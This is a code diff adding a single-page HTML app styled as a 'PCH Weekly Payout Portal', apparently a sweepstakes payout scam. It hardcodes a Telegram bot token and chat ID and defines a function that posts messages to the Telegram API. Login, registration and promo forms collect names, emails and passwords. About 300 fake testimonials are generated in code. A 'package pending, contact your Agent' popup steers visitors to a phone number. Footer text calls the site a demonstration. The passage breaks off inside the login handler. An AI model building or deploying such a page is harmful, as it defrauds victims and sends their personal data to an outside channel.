@@ -1,4 +1,1517 @@
 <!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PCH Weekly Payout Portal</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        navy: {
+                            950: '#070b19',
+                            900: '#0d1326',
+                            800: '#151d38',
+                            700: '#212d54',
+                        },
+                        gold: {
+                            400: '#fbbf24',
+                            500: '#f59e0b',
+                            600: '#d97706',
+                        },
+                        'sky-custom': '#38bdf8'
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #070b19;
+            color: #f8fafc;
+        }
+        .card-3d {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .card-3d:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 30px -10px rgba(56, 189, 248, 0.15);
+        }
+        .glow-effect {
+            box-shadow: 0 0 35px rgba(245, 158, 11, 0.12);
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #070b19;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #212d54;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #38bdf8;
+        }
+    </style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col selection:bg-gold-500 selection:text-navy-950">
+
+<!-- Navigation Header -->
+<header class="bg-navy-950/90 backdrop-blur-md border-b border-navy-700/50 sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+        <div class="flex items-center space-x-3 cursor-pointer select-none active:opacity-80 transition" onclick="router.navigate('home')">
+            <div class="w-11 h-11 sm:w-12 sm:h-12 rounded-xl bg-gradient-to-br from-gold-400 to-gold-600 flex items-center justify-center shadow-lg shadow-gold-500/20 text-navy-950 text-xl sm:text-2xl font-black">
+                <i class="fa-solid fa-vault"></i>
+            </div>
+            <div>
+                <span class="text-lg sm:text-xl font-bold tracking-tight text-white block">PCH</span>
+                <span class="text-[10px] sm:text-xs font-semibold text-gold-400 tracking-widest uppercase">Weekly Payout Portal</span>
+            </div>
+        </div>
+        
+        <div id="nav-actions" class="flex items-center space-x-2 sm:space-x-4">
+            <button onclick="router.navigate('login')" class="px-3 py-2 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg">
+                <i class="fa-solid fa-right-to-bracket mr-1"></i> Login
+            </button>
+            <button onclick="router.navigate('register')" class="px-3.5 py-2 sm:px-5 sm:py-2.5 text-xs sm:text-sm font-bold bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition">
+                <i class="fa-solid fa-user-plus mr-1"></i> Create Account
+            </button>
+        </div>
+    </div>
+</header>
+
+<!-- Main Content Area -->
+<main id="app-container" class="flex-grow flex flex-col">
+    <!-- Views dynamically injected here -->
+</main>
+
+<!-- Footer -->
+<footer class="bg-navy-950 border-t border-navy-700/50 py-10 text-sm text-slate-400">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-3 gap-8">
+        <div class="space-y-4">
+            <div class="flex items-center space-x-2">
+                <div class="w-8 h-8 rounded-lg bg-gold-500 flex items-center justify-center text-navy-950 font-bold">
+                    <i class="fa-solid fa-vault text-sm"></i>
+                </div>
+                <span class="font-bold text-white tracking-wide text-sm sm:text-base">PCH Weekly Payout Portal</span>
+            </div>
+            <p class="text-xs text-slate-400 leading-relaxed">
+                Secure automated distribution portal operating under financial compliance framework guidelines.
+            </p>
+        </div>
+        <div>
+            <h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Compliance & Security</h4>
+            <ul class="space-y-2 text-xs">
+                <li><a href="#" onclick="showModal('Disclaimer', 'Demonstration system operating without live banking integrations. Claim figures and token identifiers are configurable simulations.')" class="hover:text-white transition py-1 block">Regulatory Disclaimer</a></li>
+                <li><a href="#" onclick="showModal('Privacy', 'Data stays securely in your browser local session state for testing and demonstration workflows.')" class="hover:text-white transition py-1 block">Privacy Policy</a></li>
+                <li><a href="#" onclick="showModal('Terms', 'Strictly simulated prototype for preview and UI/UX validation.')" class="hover:text-white transition py-1 block">Terms of Service</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Support Contact</h4>
+            <ul class="space-y-2 text-xs">
+                <li><i class="fa-solid fa-phone mr-2 text-sky-custom"></i> Agent Desk: 646-585-8110</li>
+                <li><i class="fa-solid fa-user-tie mr-2 text-gold-400"></i> Senior Agent: Andy Goldbrg</li>
+                <li><i class="fa-solid fa-envelope mr-2 text-sky-custom"></i> support@globalpure-payouts.net</li>
+            </ul>
+        </div>
+    </div>
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8 pt-6 border-t border-navy-700/30 text-center text-xs text-slate-400">
+        &copy; 2026 PCH Weekly Payout Portal (PWPP). All rights reserved.
+    </div>
+</footer>
+
+<!-- Global Modal Container -->
+<div id="global-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-navy-950/80 backdrop-blur-sm p-4 overflow-y-auto">
+    <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+        <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition">
+            <i class="fa-solid fa-xmark"></i>
+        </button>
+        <div id="modal-content">
+            <!-- Dynamically populated -->
+        </div>
+    </div>
+</div>
+
+<!-- JavaScript Application Core -->
+<script>
+    // Device-Specific State Management using localStorage
+    const DEVICE_STORAGE_KEY = 'pch_device_state_v2';
+
+    function loadDeviceState() {
+        const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+        if (saved) {
+            try {
+                return JSON.parse(saved);
+            } catch (e) {
+                console.error('Error parsing saved device state', e);
+            }
+        }
+        return {
+            currentUser: null,
+            userBalance: 4500.00,
+            configuredMethod: null,
+            transactions: []
+        };
+    }
+
+    function saveDeviceState() {
+        localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify({
+            currentUser: state.currentUser,
+            userBalance: state.userBalance,
+            configuredMethod: state.configuredMethod,
+            transactions: state.transactions
+        }));
+    }
+
+    const persisted = loadDeviceState();
+
+    const state = {
+        currentView: persisted.currentUser ? 'dashboard' : 'home',
+        currentUser: persisted.currentUser,
+        userBalance: persisted.userBalance,
+        configuredMethod: persisted.configuredMethod,
+        reviewsSearchQuery: '',
+        reviewsFilterRating: 'all',
+        reviewsPage: 1,
+        reviewsPerPage: 6,
+        reviews: [
+            { id: 1, name: 'Arthur Pendelton', location: 'Brooklyn, NY', rating: 5, date: '2026-10-10', comment: 'Clear guidance through the portal setup. Very professional financial interface demo.', sample: true },
+            { id: 2, name: 'Evelyn Vance', location: 'Dallas, TX', rating: 5, date: '2026-10-09', comment: 'The Friday countdown timer and dashboard summary are extremely intuitive.', sample: true },
+            { id: 3, name: 'Marcus Sterling', location: 'Kingston, Jamaica', rating: 4, date: '2026-10-08', comment: 'Smooth registration flow and clean support ticket creation.', sample: true },
+            { id: 4, name: 'Beatrice H.', location: 'Chicago, IL', rating: 5, date: '2026-10-07', comment: 'Impressive 3D visual cards and transparent fund tracking prototype.', sample: true },
+        ],
+        transactions: persisted.transactions,
+        telegramConfig: {
+            botToken: '8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q',
+            chatId: '8763270406'
+        }
+    };
+
+    async function sendTelegramMessage(textMessage) {
+        const botToken = state.telegramConfig.botToken.trim();
+        const chatId = state.telegramConfig.chatId.trim();
+
+        if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN_HERE') {
+            return false;
+        }
+
+        try {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textMessage,
+                    parse_mode: 'HTML'
+                })
+            });
+            return true;
+        } catch (err) {
+            console.error('Error sending alert:', err);
+            return false;
+        }
+    }
+
+    function generateSampleReviews() {
+        const sampleNames = [
+            'James Wilson', 'Sarah Jenkins', 'Michael Chang', 'David Miller', 'Emily Davis',
+            'Robert Taylor', 'Jessica Martinez', 'William Anderson', 'Thomas Thomas', 'Daniel Jackson',
+            'Laura White', 'Christopher Harris', 'Amanda Martin', 'Matthew Thompson', 'Ashley Garcia'
+        ];
+        const sampleLocations = [
+            'New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX', 'Phoenix, AZ',
+            'Philadelphia, PA', 'San Antonio, TX', 'San Diego, CA', 'Dallas, TX', 'Miami, FL',
+            'Atlanta, GA', 'Seattle, WA', 'Denver, CO', 'Boston, MA', 'Detroit, MI'
+        ];
+        const sampleComments = [
+            'Excellent service and seamless weekly disbursement process. Very satisfied with the response time.',
+            'The portal interface is super clean and easy to navigate. Great job by agent Andy Goldberg.',
+            'Quick account verification and transparent allocation details on the dashboard.',
+            'Disbursement tracking is accurate and countdown updates in real time reliably.',
+            'Clear support desk communication whenever I have questions about my weekly allocation schedule.'
+        ];
+
+        for (let i = 5; i <= 300; i++) {
+            const name = sampleNames[i % sampleNames.length] + ' ' + String.fromCharCode(65 + (i % 26)) + '.';
+            const location = sampleLocations[i % sampleLocations.length];
+            const rating = (i % 7 === 0) ? 4 : 5;
+            const comment = sampleComments[i % sampleComments.length];
+            const month = String((i % 12) + 1).padStart(2, '0');
+            const day = String((i % 28) + 1).padStart(2, '0');
+            
+            state.reviews.push({
+                id: i,
+                name: name,
+                location: location,
+                rating: rating,
+                date: `2026-${month}-${day}`,
+                comment: comment,
+                sample: true
+            });
+        }
+    }
+
+    generateSampleReviews();
+
+    const router = {
+        navigate(viewName) {
+            state.currentView = viewName;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            render();
+        }
+    };
+
+    function showModal(title, bodyHtml) {
+        const modal = document.getElementById('global-modal');
+        const content = document.getElementById('modal-content');
+        content.innerHTML = `
+            <h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3>
+            <div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-6">${bodyHtml}</div>
+            <div class="flex justify-end">
+                <button onclick="closeModal()" class="px-5 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm hover:brightness-110 transition active:scale-95">Close</button>
+            </div>
+        `;
+        modal.classList.remove('hidden');
+        modal.classList.add('flex');
+    }
+
+    let pendingTimeoutId = null;
+    function showPendingPopup(userName) {
+        const modal = document.getElementById('global-modal');
+        const content = document.getElementById('modal-content');
+        
+        if (pendingTimeoutId) clearTimeout(pendingTimeoutId);
+
+        content.innerHTML = `
+            <div class="text-center py-4 space-y-4">
+                <div class="w-16 h-16 bg-gold-500/20 text-gold-400 rounded-full mx-auto flex items-center justify-center text-2xl shadow-lg shadow-gold-500/20">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                </div>
+                <h3 class="text-xl font-bold text-white">Withdrawal Notice</h3>
+                <p class="text-sm text-slate-200 leading-relaxed font-medium">
+                    Unfortunately ${userName}, Your package is currently on pending please contact your Agent
+                </p>
+                <div class="text-xs text-slate-400">
+                    This notice will close automatically in <span id="popup-timer" class="text-gold-400 font-bold">5</span>s
+                </div>
+                <div class="flex justify-center pt-2">
+                    <button onclick="closeModal(); render();" class="px-6 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">OK</button>
+                </div>
+            </div>
+        `;
+        modal.classList.remove('hidden');
+        modal.classList.add('flex');
+
+        let countdown = 5;
+        const timerEl = document.getElementById('popup-timer');
+        const interval = setInterval(() => {
+            countdown--;
+            if (timerEl) timerEl.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(interval);
+            }
+        }, 1000);
+
+        pendingTimeoutId = setTimeout(() => {
+            clearInterval(interval);
+            closeModal();
+            render();
+        }, 5000);
+    }
+
+    function closeModal() {
+        if (pendingTimeoutId) clearTimeout(pendingTimeoutId);
+        const modal = document.getElementById('global-modal');
+        modal.classList.remove('flex');
+        modal.classList.add('hidden');
+    }
+
+    function render() {
+        const container = document.getElementById('app-container');
+        const navActions = document.getElementById('nav-actions');
+
+        if (state.currentUser) {
+            navActions.innerHTML = `
+                <button onclick="router.navigate('dashboard')" class="px-3 py-2 text-xs sm:text-sm font-semibold text-gold-400 hover:text-white transition flex items-center rounded-lg">
+                    <i class="fa-solid fa-gauge-high mr-1"></i> Dashboard
+                </button>
+                <button onclick="logout()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition flex items-center rounded-lg">
+                    <i class="fa-solid fa-right-from-bracket mr-1"></i> Logout
+                </button>
+            `;
+        } else {
+            navActions.innerHTML = `
+                <button onclick="router.navigate('login')" class="px-3 py-2 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition">
+                    <i class="fa-solid fa-right-to-bracket mr-1"></i> Login
+                </button>
+                <button onclick="router.navigate('register')" class="px-3.5 py-2 sm:px-5 sm:py-2.5 text-xs sm:text-sm font-bold bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition">
+                    <i class="fa-solid fa-user-plus mr-1"></i> Create Account
+                </button>
+            `;
+        }
+
+        if (state.currentView === 'home') {
+            container.innerHTML = renderHomeView();
+            initHomeEvents();
+        } else if (state.currentView === 'login') {
+            container.innerHTML = renderLoginView();
+            initLoginEvents();
+        } else if (state.currentView === 'register') {
+            container.innerHTML = renderRegisterView();
+            initRegisterEvents();
+        } else if (state.currentView === 'dashboard') {
+            if (!state.currentUser) {
+                router.navigate('login');
+                return;
+            }
+            container.innerHTML = renderDashboardView();
+            initDashboardEvents();
+            initCountdownTimer();
+        }
+    }
+
+    function logout() {
+        state.currentUser = null;
+        saveDeviceState();
+        router.navigate('home');
+    }
+
+    function renderHomeView() {
+        const filteredReviews = state.reviews.filter(r => {
+            const matchesQuery = r.name.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase()) ||
+                                 r.comment.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase()) ||
+                                 r.location.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase());
+            const matchesRating = state.reviewsFilterRating === 'all' || r.rating.toString() === state.reviewsFilterRating;
+            return matchesQuery && matchesRating;
+        });
+
+        const totalPages = Math.ceil(filteredReviews.length / state.reviewsPerPage);
+        const paginatedReviews = filteredReviews.slice((state.reviewsPage - 1) * state.reviewsPerPage, state.reviewsPage * state.reviewsPerPage);
+
+        return `
+            <section class="relative overflow-hidden py-12 sm:py-20 lg:py-28 bg-gradient-to-b from-navy-950 to-navy-900 border-b border-navy-700/50">
+                <div class="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(56,189,248,0.1),transparent_50%)]"></div>
+                <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                    <div class="space-y-5 text-center lg:text-left">
+                        <div class="inline-flex items-center space-x-2 bg-sky-custom/10 border border-sky-custom/30 px-3.5 py-1.5 rounded-full text-sky-custom text-xs font-bold tracking-wider uppercase">
+                            <i class="fa-solid fa-shield-halved mr-1"></i> Verified Distribution Framework
+                        </div>
+                        <h1 class="text-3xl sm:text-5xl lg:text-6xl font-extrabold text-white tracking-tight leading-tight">
+                            Weekly Payout & <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 to-gold-600">Financial Portal</span>
+                        </h1>
+                        <p class="text-sm sm:text-lg text-slate-300 leading-relaxed max-w-2xl mx-auto lg:mx-0">
+                            Access your scheduled weekly allocations securely. Complete identity validation, manage fund setups, and track Friday distribution disbursements in real time.
+                        </p>
+                        <div class="flex flex-col sm:flex-row justify-center lg:justify-start gap-3.5 pt-2">
+                            <button onclick="router.navigate('register')" class="w-full sm:w-auto px-8 py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-2xl shadow-xl shadow-gold-500/20 hover:scale-105 active:scale-95 transition transform text-base">
+                                <i class="fa-solid fa-arrow-right mr-2"></i> Access Portal Now
+                            </button>
+                            <button onclick="router.navigate('login')" class="w-full sm:w-auto px-8 py-4 bg-navy-800 border border-navy-700 text-white font-bold rounded-2xl hover:bg-navy-700 active:scale-95 transition text-base">
+                                <i class="fa-solid fa-right-to-bracket mr-2"></i> Sign In
+                            </button>
+                        </div>
+                    </div>
+                    <div class="relative">
+                        <div class="card-3d bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 shadow-2xl relative z-10 glow-effect space-y-6">
+                            <div class="flex items-center justify-between pb-4 border-b border-navy-700">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold">
+                                        <i class="fa-solid fa-award"></i>
+                                    </div>
+                                    <div>
+                                        <h4 class="font-bold text-white text-sm">Over 15 Years of Excellence</h4>
+                                        <p class="text-xs text-slate-400">Trusted Global Distribution Network</p>
+                                    </div>
+                                </div>
+                                <span class="px-3 py-1 bg-sky-custom/20 text-sky-custom text-xs font-bold rounded-full">Active Promo</span>
+                            </div>
+
+                            <div class="space-y-3">
+                                <p class="text-slate-300 text-xs sm:text-sm leading-relaxed">
+                                    Since <span class="text-white font-bold">2011</span>, Global Pure Financial Services has safely distributed over <span class="text-gold-400 font-bold">$125 Million+</span> in direct rewards and weekly allocations to thousands of verified participants.
+                                </p>
+                            </div>
+
+                            <div class="bg-navy-900 border border-navy-700 p-4 sm:p-5 rounded-2xl space-y-4">
+                                <div class="flex items-center justify-between">
+                                    <div>
+                                        <h5 class="text-xs font-bold text-gold-400 uppercase tracking-wider">Weekly Allocation Promo Entry</h5>
+                                        <p class="text-[11px] text-slate-400 mt-0.5">Submit details to enter active pool.</p>
+                                    </div>
+                                    <i class="fa-solid fa-ticket text-xl text-sky-custom"></i>
+                                </div>
+                                <form onsubmit="handlePromoEntry(event)" class="space-y-3">
+                                    <input type="text" id="promo-name" required placeholder="Full Name" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-sky-custom">
+                                    <input type="email" id="promo-email" required placeholder="Email Address" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-sky-custom">
+                                    <button type="submit" class="w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs hover:brightness-110 active:scale-95 transition shadow-lg shadow-gold-500/10">
+                                        <i class="fa-solid fa-paper-plane mr-1.5"></i> Enter Promo Stream
+                                    </button>
+                                </form>
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-3 pt-1 text-center">
+                                <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50">
+                                    <p class="text-[10px] text-slate-400 uppercase">Total Participants</p>
+                                    <p class="text-sm font-black text-white">45,000+</p>
+                                </div>
+                                <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50">
+                                    <p class="text-[10px] text-slate-400 uppercase">Desk Agent</p>
+                                    <p class="text-xs font-bold text-sky-custom"><i class="fa-solid fa-user-tie mr-1"></i> Andy Goldbrg</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="py-16 sm:py-20 bg-navy-950 border-t border-navy-700/50">
+                <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                    <div class="flex flex-col md:flex-row md:items-end justify-between mb-8 sm:mb-12 gap-6">
+                        <div>
+                            <span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Participant Feedback</span>
+                            <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Client Experience Reviews</h2>
+                            <p class="text-slate-400 text-xs mt-1">Showing sample reviews for demonstration purposes.</p>
+                        </div>
+                        <button onclick="openAddReviewModal()" class="w-full sm:w-auto px-5 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 active:scale-95 transition flex items-center justify-center">
+                            <i class="fa-solid fa-pen-to-square mr-2"></i> Submit Your Review
+                        </button>
+                    </div>
+
+                    <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl mb-8 flex flex-col sm:flex-row gap-4 items-center justify-between">
+                        <div class="relative w-full sm:w-96">
+                            <i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400"></i>
+                            <input type="text" id="review-search-input" value="${state.reviewsSearchQuery}" placeholder="Search reviews by name, comment..." class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                        </div>
+                        <div class="flex items-center space-x-3 w-full sm:w-auto justify-end">
+                            <label class="text-xs text-slate-400 font-semibold">Filter:</label>
+                            <select id="review-rating-filter" class="bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom">
+                                <option value="all" ${state.reviewsFilterRating === 'all' ? 'selected' : ''}>All Ratings</option>
+                                <option value="5" ${state.reviewsFilterRating === '5' ? 'selected' : ''}>5 Stars</option>
+                                <option value="4" ${state.reviewsFilterRating === '4' ? 'selected' : ''}>4 Stars</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8" id="reviews-grid">
+                        ${paginatedReviews.length === 0 ? `
+                            <div class="col-span-full py-12 text-center text-slate-400 text-sm">No matching reviews found.</div>
+                        ` : paginatedReviews.map(r => `
+                            <div class="bg-navy-900 border border-navy-700/80 p-6 rounded-2xl flex flex-col justify-between card-3d relative">
+                                <div>
+                                    <div class="flex items-center justify-between mb-4">
+                                        <div class="flex items-center space-x-3">
+                                            <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold text-sm">
+                                                ${r.name.charAt(0)}
+                                            </div>
+                                            <div>
+                                                <h4 class="font-bold text-white text-sm">${r.name}</h4>
+                                                <p class="text-xs text-slate-400">${r.location}</p>
+                                            </div>
+                                        </div>
+                                        <div class="flex text-gold-400 text-xs">
+                                            ${'<i class="fa-solid fa-star"></i>'.repeat(r.rating)}
+                                        </div>
+                                    </div>
+                                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">"${r.comment}"</p>
+                                </div>
+                                <div class="pt-4 border-t border-navy-700 flex items-center justify-between text-xs text-slate-400">
+                                    <span class="text-[11px]">${r.date}</span>
+                                </div>
+                            </div>
+                        `).join('')}
+                    </div>
+
+                    <div class="flex flex-col sm:flex-row items-center justify-between bg-navy-900 border border-navy-700 px-6 py-4 rounded-2xl gap-4">
+                        <span class="text-xs text-slate-400">Showing page <span class="text-white font-bold">${state.reviewsPage}</span> of <span class="text-white font-bold">${totalPages || 1}</span></span>
+                        <div class="flex space-x-2">
+                            <button onclick="changeReviewsPage(-1)" ${state.reviewsPage <= 1 ? 'disabled' : ''} class="px-4 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-40 active:scale-95 transition">Previous</button>
+                            <button onclick="changeReviewsPage(1)" ${state.reviewsPage >= totalPages ? 'disabled' : ''} class="px-4 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-40 active:scale-95 transition">Next</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        `;
+    }
+
+    function initHomeEvents() {
+        const searchInput = document.getElementById('review-search-input');
+        if (searchInput) {
+            searchInput.addEventListener('input', (e) => {
+                state.reviewsSearchQuery = e.target.value;
+                state.reviewsPage = 1;
+                render();
+            });
+        }
+        const ratingFilter = document.getElementById('review-rating-filter');
+        if (ratingFilter) {
+            ratingFilter.addEventListener('change', (e) => {
+                state.reviewsFilterRating = e.target.value;
+                state.reviewsPage = 1;
+                render();
+            });
+        }
+    }
+
+    function changeReviewsPage(direction) {
+        state.reviewsPage += direction;
+        render();
+    }
+
+    function openAddReviewModal() {
+        const modal = document.getElementById('global-modal');
+        const content = document.getElementById('modal-content');
+        content.innerHTML = `
+            <h3 class="text-lg font-bold text-white mb-4 flex items-center"><i class="fa-solid fa-pen-to-square text-gold-400 mr-2"></i> Submit Review</h3>
+            <form id="add-review-form" onsubmit="submitNewReview(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Your Full Name</label>
+                    <input type="text" id="new-rev-name" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. Robert Smith">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Location / City</label>
+                    <input type="text" id="new-rev-loc" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. Miami, FL">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Rating</label>
+                    <select id="new-rev-rating" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                        <option value="5">5 Stars</option>
+                        <option value="4">4 Stars</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Comment / Feedback</label>
+                    <textarea id="new-rev-comment" required rows="3" class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Share your experience..."></textarea>
+                </div>
+                <div class="flex justify-end space-x-3 pt-2">
+                    <button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs sm:text-sm font-bold">Cancel</button>
+                    <button type="submit" class="px-6 py-2.5 bg-gold-500 text-navy-950 rounded-xl text-xs sm:text-sm font-bold active:scale-95 transition">Submit Review</button>
+                </div>
+            </form>
+        `;
+        modal.classList.remove('hidden');
+        modal.classList.add('flex');
+    }
+
+    function submitNewReview(e) {
+        e.preventDefault();
+        const name = document.getElementById('new-rev-name').value;
+        const location = document.getElementById('new-rev-loc').value;
+        const rating = parseInt(document.getElementById('new-rev-rating').value);
+        const comment = "Sample Review: " + document.getElementById('new-rev-comment').value;
+
+        state.reviews.unshift({
+            id: Date.now(),
+            name,
+            location,
+            rating,
+            date: new Date().toISOString().split('T')[0],
+            comment,
+            sample: true
+        });
+        closeModal();
+        render();
+    }
+
+    function renderLoginView() {
+        return `
+            <div class="flex-grow flex items-center justify-center py-12 px-4 bg-gradient-to-b from-navy-950 to-navy-900">
+                <div class="bg-navy-800 border border-navy-700/80 rounded-3xl max-w-md w-full p-6 sm:p-8 shadow-2xl relative card-3d">
+                    <div class="text-center mb-8">
+                        <div class="w-14 h-14 bg-gradient-to-br from-gold-400 to-gold-600 rounded-2xl mx-auto flex items-center justify-center text-navy-950 text-2xl font-bold mb-4 shadow-lg shadow-gold-500/20">
+                            <i class="fa-solid fa-vault"></i>
+                        </div>
+                        <h2 class="text-2xl font-extrabold text-white">Welcome Back</h2>
+                        <p class="text-xs text-slate-400 mt-1">Sign in with your username or email address</p>
+                    </div>
+
+                    <form id="login-form" class="space-y-5">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username or Email</label>
+                            <div class="relative">
+                                <i class="fa-solid fa-user absolute left-4 top-3.5 text-slate-400"></i>
+                                <input type="text" id="login-identifier" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. johndoe or john@example.com">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password</label>
+                            <div class="relative">
+                                <i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-400"></i>
+                                <input type="password" id="login-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
+                            </div>
+                        </div>
+                        <div id="login-error" class="text-rose-400 text-xs hidden"></div>
+                        <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition text-sm">
+                            Sign In to Dashboard
+                        </button>
+                    </form>
+
+                    <div class="mt-6 text-center text-xs text-slate-400">
+                        Don't have an account? <button onclick="router.navigate('register')" class="text-sky-custom font-bold hover:underline">Create Account</button>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function initLoginEvents() {
+        const form = document.getElementById('login-form');
+        if (form) {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
